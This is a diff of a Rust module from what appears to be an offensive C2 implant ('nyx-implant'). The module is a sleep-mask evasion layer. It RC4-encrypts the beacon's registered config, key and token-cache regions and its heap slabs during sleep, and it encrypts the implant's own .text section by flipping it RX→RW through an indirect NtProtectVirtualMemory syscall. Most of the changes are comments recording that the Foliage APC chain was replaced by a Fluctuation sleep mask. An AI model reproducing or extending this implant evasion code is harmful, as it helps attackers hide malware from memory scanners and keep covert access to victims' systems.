@@ -4,22 +4,25 @@
 //! pure-Rust RC4 core (`nyx-implant-evasionsdk::rc4`, 6 tests green) to encrypt
 //! registered sensitive regions in place around each sleep, with a verified
 //! round-trip (encrypt then decrypt restores byte-identical). The *timing*
-//! primitive that owns the mask→sleep→unmask window (Ekko/Foliage APC→
-//! `NtContinue`) is research-grade and lives gated in the shell crate's `kits`
-//! module (the `SleepmaskKit` seam, default `NoMask`; an intra-doc link here
-//! broke when this module moved out of the shell crate in the WP-C split);
-//! this module is the memory half that
-//! a Foliage impl will call into.
+//! primitive that owns the mask→sleep→unmask window is the Fluctuation sleep
+//! mask (`crate::fluctuation::sleep`, reached via the shell crate's `kits`
+//! module `SleepmaskKit` seam; an intra-doc link here broke when this module
+//! moved out of the shell crate in the WP-C split). Fluctuation calls
+//! [`mask`]/[`unmask`] around its page-flip sleep — this module is the memory
+//! half it calls into. (The older Ekko/Foliage APC→`NtContinue` timing
+//! primitive was deliberately removed, commit 841ffc5.)
 //!
 //! ## What's real vs gated
 //! - **Real**: RC4 mask/unmask of registered `&mut [u8]` regions, idempotent-
 //!   guarded against double-mask, key derived per-run from the syscall runtime
 //!   so the keystream differs across boots. A selftest proves the round-trip.
-//! - **Gated**: encrypting the implant `.text` itself requires flipping the
+//! - **Dormant**: encrypting the implant `.text` itself requires flipping the
 //!   section RX→RW (a code-integrity signal) and only makes sense *during* a
-//!   sleep the beacon thread isn't executing through — that's the APC chain in
-//!   `kits`, not safe to do synchronously from the beacon thread. This module
-//!   masks *data* regions, never the running code.
+//!   sleep the beacon thread isn't executing through — that was the Foliage
+//!   APC chain's job (removed, commit 841ffc5), not safe to do synchronously
+//!   from the beacon thread. This module masks *data* regions, never the
+//!   running code; the combined text+heap fns below are kept for a future
+//!   helper-thread wiring (see their doc comments).
 //!
 //! ## Single-source-of-truth
 //! The RC4 KSA+PRGA math lives ONLY in `nyx-implant-evasionsdk::rc4`. This
@@ -188,7 +191,8 @@ pub fn registered_count() -> usize {
 
 /// Encrypt the registered sensitive regions in place (RC4). Idempotent-guarded:
 /// a second call while already masked is a no-op (prevents keystream∘keystream
-/// corruption). Does NOT touch the running `.text` — that's the gated APC path.
+/// corruption). Does NOT touch the running `.text` — that path was removed
+/// with the Foliage APC chain (commit 841ffc5).
 pub fn mask() {
     if MASK_STATE
         .compare_exchange(0, 1, Ordering::AcqRel, Ordering::Relaxed)
@@ -213,7 +217,8 @@ pub fn unmask() {
 }
 
 /// Collect registered regions + all allocator slabs into a single mask list.
-/// Called by the Foliage helper thread during the mask window. Each entry is
+/// Called by the dormant text+heap fns below during the mask window (no live
+/// callers today — pending helper-thread wiring). Each entry is
 /// `(base_ptr, byte_len)` — the caller RC4's each region with the same key.
 ///
 /// Registered regions (config, key, token cache) take priority slots; allocator
@@ -242,15 +247,15 @@ pub fn enumerate_beacon_heap_regions() -> alloc::vec::Vec<(*mut u8, usize)> {
 }
 
 /// Mask text + all registered + heap regions in a single RC4 pass.
-/// Called by the Foliage helper inside the mask window (beacon is in alertable
-/// sleep). The caller supplies the raw NtProtectVirtualMemory for .text and
-/// the RC4 key.
+/// Intended for a helper thread inside the mask window (beacon parked in
+/// alertable sleep). The caller supplies the raw NtProtectVirtualMemory for
+/// .text and the RC4 key.
 ///
 /// # Status: dead code — pending wiring
 ///
-/// Zero callers. Originally wired into the now-deprecated `sleep::sleep()`
-/// Foliage APC path; with the beacon loop routing through
-/// `fluctuation::sleep` (which uses `mask_heap_regions`/`unmask_heap_regions`
+/// Zero callers. Originally wired into the now-deleted Foliage APC path
+/// (commit 841ffc5); with the beacon loop routing through
+/// `fluctuation::sleep` (which uses `mask`/`unmask` over registered regions
 /// instead, NOT this combined text+heap variant), this entry point is
 /// dormant. Kept to be revived when the full Fluctuation sleep-obfuscation
 /// chain reintroduces `.text` masking via a helper thread. Do NOT delete.
@@ -318,13 +323,15 @@ pub unsafe fn unmask_text_and_heap(
 }
 
 /// Mask only the registered regions + heap slabs (NOT .text).
-/// Called by the Foliage helper after .text is already masked, to cover
-/// heap-allocated sensitive data (config, key, token cache, BOF scratch).
+/// Zero live callers (the Foliage helper that called this after masking
+/// `.text` was removed in commit 841ffc5); kept with the dormant text+heap
+/// fns above pending helper-thread wiring. Covers heap-allocated sensitive
+/// data (config, key, token cache, BOF scratch).
 /// Uses the same RC4 key as the .text mask so a single key covers everything.
 pub fn mask_heap_regions(key: &[u8]) {
     for (ptr, len) in enumerate_beacon_heap_regions() {
         // SAFETY: the region was registered/allocated as a mutable buffer;
-        // the beacon thread is in alertable sleep during the Foliage mask window.
+        // the beacon thread is in alertable sleep during the mask window.
         let region = unsafe { core::slice::from_raw_parts_mut(ptr, len) };
         Rc4::apply_oneshot(key, region);
     }
@@ -355,13 +362,15 @@ pub fn round_trip_selftest(input: &mut [u8]) {
 }
 
 /// Mask the implant `.text` region in place: flip RX→RW, RC4-encrypt. For use
-/// INSIDE a Foliage chain (sleep.rs steps 2-3 / 8-9), NOT from the beacon
+/// INSIDE a sleep-mask chain where the beacon thread is parked (originally
+/// the Foliage chain, removed in commit 841ffc5; today called by
+/// `evasion_glue`'s `MemoryMaskKit` impl), NOT from the beacon
 /// thread synchronously — encrypting the running code page while executing
 /// through it crashes immediately.
 ///
 /// # Safety
 /// Caller MUST guarantee the beacon thread is NOT executing within `[base,
-/// base+len)` (it's sleeping through a Foliage cycle). Single-threaded context.
+/// base+len)` (it's sleeping through a mask cycle). Single-threaded context.
 pub unsafe fn mask_text(base: usize, len: usize, key: &[u8]) {
     // Flip RX→RW via NtProtectVirtualMemory (indirect syscall).
     if let Some(rt) = nyx_implant_core::syscalls::global() {
